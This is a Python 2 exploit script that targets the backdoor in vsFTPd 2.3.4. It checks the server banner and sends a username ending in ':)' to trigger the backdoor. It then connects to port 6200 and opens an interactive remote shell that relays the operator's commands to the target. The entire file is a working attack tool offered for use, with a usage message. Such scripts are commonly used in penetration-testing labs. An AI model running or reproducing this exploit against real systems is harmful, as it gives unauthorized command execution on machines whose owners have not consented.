#!/usr/bin/python

import socket
import sys
import threading 
import time

class Cores(object):
    RED = '\033[1;31m'
    BLUE = '\033[94m'
    BOLD = '\033[1m'
    GREEN = '\033[32m'
    OTRO = '\033[36m'
    YELLOW = '\033[33m'
    ENDC = '\033[0m'

class Exploit(object):
    def __init__(self):
        self.ip = None
        self.port = None
        self.port_backdoor = 6200    
    def help(self):
        helper = Cores.YELLOW + '''
coded by: RNX
[*] Usage: python {} <ip> <port>
        '''.format(sys.argv[0])
	print helper
    def verify_args(self):
        try:
            self.ip = str(sys.argv[1])
            self.port = int(sys.argv[2])
        except IndexError:
            self.help()
            sys.exit()
    def connect_ftp_port(self, ip, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        banner = s.recv(1024)
        time.sleep(1)
        if( 'vsFTPd 2.3.4' in banner ):
            print Cores.RED + '[+] ExPloItInG...'
            print Cores.BLUE + '\n[*] Opening port 6200...'
            s.send('USER qwertyuuu:)\r\n')
            dados = s.recv(1024)
            s.send('PASS qwertyuuu:)\r\n')
            dados = s.recv(1024)
        else:
            print Cores.RED + '\n[!] vsFTPd 2.3.4 not found'
            sys.exit()
    def response_shell(self, sock, status):
        sock.settimeout(5)
        while( status == True ):
            try:
                print sock.recv(1024).strip() + '\n'
            except socket.timeout:
                pass
            except Exception:
                return
    def connect_port_backdoor(self):
        backdoor_status = True
        portbackdoorConnect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connect_ftp_port(self.ip, self.port)
        try:
            print Cores.BLUE + '[*] Connecting port 6200...'
            portbackdoorConnect.connect((self.ip, self.port_backdoor))
            time.sleep(3)
        except Exception:
            print Cores.RED + '[-] Error to connect port 6200!'
            sys.exit()
        shellThread = threading.Thread(target=self.response_shell, args=(portbackdoorConnect, backdoor_status))
        shellThread.start()
        print Cores.ENDC + '\n[*] ExPlOiT SuCcEssFulLy\n'
        while( True ):
            command = raw_input()
            if( command == 'exit' ):
                portbackdoorConnect.close()
                shellThread.join()
                sys.exit()
            else:
                portbackdoorConnect.send(command + '\n')
    def run(self):
        self.verify_args()
        self.connect_port_backdoor()
def main():
    exploit = Exploit()
    exploit.run()

if( __name__ == '__main__' ):
    main()
